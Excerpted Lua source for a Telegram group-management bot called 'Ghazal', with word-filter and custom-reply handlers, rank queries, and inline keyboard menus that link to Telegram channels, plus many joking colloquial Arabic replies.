send(msg.chat_id_, msg.id_," ⦿ ارسل الكلمه الان")  
database:set(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."G8AZAL1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."G8AZAL1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."G8AZAL1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."G8AZAL1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."G8AZAL1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ⦿ قائمة المنع \n●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n"
for k,v in pairs(list) do  
local G8AZAL_Msg = database:get(bot_id.."G8AZAL1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.."  ↜:{"..G8AZAL_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'غزال').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'غزال')
local G8AZAL_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس غزال🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n◐ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:G8AZAL:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:G8AZAL:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:G8AZAL:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"◐︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:G8AZAL:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:G8AZAL:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:G8AZAL:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:G8AZAL:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:G8AZAL:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:G8AZAL:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:G8AZAL:List:Rd:Sudo")
end
...
end --الكود حصري سورس غزاليعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:G8AZAL:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_," ⦿ارسل الان الكلمه لمسحها ")
end
if text then  
local test = database:get(bot_id.."botss:G8AZAL:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:G8AZAL:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:G8AZAL:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:G8AZAL:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_," ⦿تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:G8AZAL:Add:Rd:Sudo:Text2"..text)   
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'غزال').." غادر" or text == 'غادر' then  
...
local tessttm = 'المشتركيننن ⇐ '..Users..''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = tessttmos, url = "https://t.me/Ghazal_Source"},
},
{
{text = tessttmo, url = "https://t.me/Ghazal_Source"},
},
{
{text = tessttm, url = "https://t.me/Ghazal_Source"},
},
{
...
if text == 'رتبتي' then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,'🌚🧞  رتـبـتـك هـي ➢ '..rtp)
end
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/G8AZAAL)')
return false
end
...
send(msg.chat_id_,msg.id_, ' شغال يا قلبي 🌚❤️🧞 ') 
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/Ghazal_Source)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/Ghazal_Source)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..⦿♥️](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/Ghazal_Source)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤⦿](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..??](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..⦿💕](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..☆💕](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متبقاش شخص تيلجرامي كدا واستنضف 🙂🚶🎌](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بالتكت بتعها..🙄💔](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[كفايه شقط يبني سيب حاجه لغيرك 😹??](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يتي كبرت وبقيت بتشبك الكلام..🥺💘](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[فرح امك قريب 😹](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نت هتنكد لي طيب..🥺💔](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[باي ياحته مني..🥺💘](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[♤ العفو ياروحي..🌚💘](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اما انت غتت صحيح💔🥺](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[هاى ماى جايز❤️😉](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صبح صبح ياعم الحج 🙄❤️](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/Ghazal_Source)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/Ghazal_Source)')
return false
end
end
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖢅ٖ اكتب تفعيل نسبه جمالي") 
return false  
end
if Sudo(msg) then
local function getpro(extra, result, success)
...
-- vardump(data) 
G8AZALdx(msg.chat_id_, msg.id_, ' ⦿ ايدي المجموعة  ↜:↝ '..msg.chat_id_..' ↜\n ⦿ عدد الادمنيه  ↜:↝ *'..data.administrator_count_..' ↜*\n ⦿ عدد المحظورين  ↜:↝ *'..data.kicked_count_..' ↜*\n ⦿ عدد الاعضاء  ↜:↝ *'..data.member_count_..' ↜*\n', 'md') 
end 
...
[🎯 ألعاب سورس غزال الأفضل في التليجرام •]
...
{
{text = '⚡⠇ٰ⁦ألُعٍآب غزال آلُمتطُۆرٍہ ٖ⠇ٰ⁦⚡', callback_data="/sofi"},
},
{
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/joooooookl/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{
{text = '𓆩𝙂8𝘼𝙕𝘼𝙇𓆪', url="t.me/Ghazal_Source"},
},
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●
 اختر الامر الذي تريدها .↑●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●
ده من الازرار بلاسفل . ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●
●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●
 ❲[˹《♡ 𝙂8𝘼𝙕𝘼𝙇 ♡》˼ ](t.me/Ghazal_Source)❳ 
]]
keyboard = {} 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐂𝐇 𝐆8𝐀𝐙𝐀𝐋 ✹ 🧞',url="t.me/NECO_TIN"}},
{{text = '⁨⌯𝙶𝙷𝙰𝚉𝙰𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 🦌🏴‍☠️⇣',url="t.me/Ghazal_Source"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐅𝐀𝐌𝐈𝐋𝐘 𝐆8𝐀𝐙𝐀𝐋 ✹ 🧞',url="t.me/J_G_A"}},
{{text = '⁨⌯𝙶𝙷𝙰𝚉𝙰𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 🦌🏴‍☠️⇣',url="t.me/Ghazal_Source"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐆8𝐀𝐙𝐀𝐋 𝐁𝐎𝐓 ✹ 🧞',url="t.me/R_S_SR_bot"}},
{{text = '🧞 ✹ 𝐑𝐎𝐎𝐃𝐘 𝐁𝐎𝐓 ✹ 🧞',url="t.me/UU_8GBOT"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐂𝐇 𝐒𝐀𝐒𝐀✹ 🧞',url="t.me/NECO_TIN"}},
{{text = '⁨⌯𝙶𝙷𝙰𝚉𝙰𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 🦌🏴‍☠️⇣',url="t.me/Ghazal_Source"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/sasa"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/sasa_p' then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '™✹ 𝐅𝐀𝐌𝐈𝐋𝐘 𝐒𝐀𝐒𝐀 ✹',url="t.me/TM_ATLANTIS"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/sasa"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐀𝐒𝐀 𝐁𝐎𝐓',url="t.me/revorbot"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/sasa"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐂𝐇 𝐁𝐎𝐆𝐘✹ 🧞',url="t.me/DB0GY"}},
{{text = '⁨⌯𝙶𝙷𝙰𝚉𝙰𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 🦌🏴‍☠️⇣',url="t.me/Ghazal_Source"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bogy"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/bogy_b' then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '™✹ 𝐅𝐀𝐌𝐈𝐋𝐘 𝐁𝐎𝐆𝐘 ✹',url="t.me/Modyoop"}},
{{text = '✹ 𝐂𝐇 • 𝐁𝐎𝐆𝐘 ✹',url="t.me/DB0GY"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bogy"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐁𝐎𝐆𝐘 𝐁𝐎𝐓',url="t.me/B_O_G_Y_bot"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bogy"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦᪣𝙂8𝘼𝙕𝘼𝙇᪣⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦᪣𝙂8𝘼𝙕𝘼𝙇᪣⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[˹《♡ 𝙂8𝘼𝙕𝘼𝙇 ♡》˼ ](t.me/Ghazal_Source)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'غزال')
...
G8AZAL = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(G8AZAL)
...
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
SourceG8AZAL(data.message_,data)
plugin_G8AZAL(data.message_)
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
local G8AZALAbot = database:get(bot_id.."G8AZAL1:Add:Filter:Rp2"..text..result.chat_id_)   
if G8AZALAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⦿ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⦿ ["..G8AZALAbot.."] \n") 
...
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
if text then
local G8AZAL1_Msg = database:get(bot_id.."G8AZAL1:Add:Filter:Rp2"..text..result.chat_id_)   
if G8AZAL1_Msg then    
send(msg.chat_id_, msg.id_," ⦿ "..G8AZAL1_Msg)
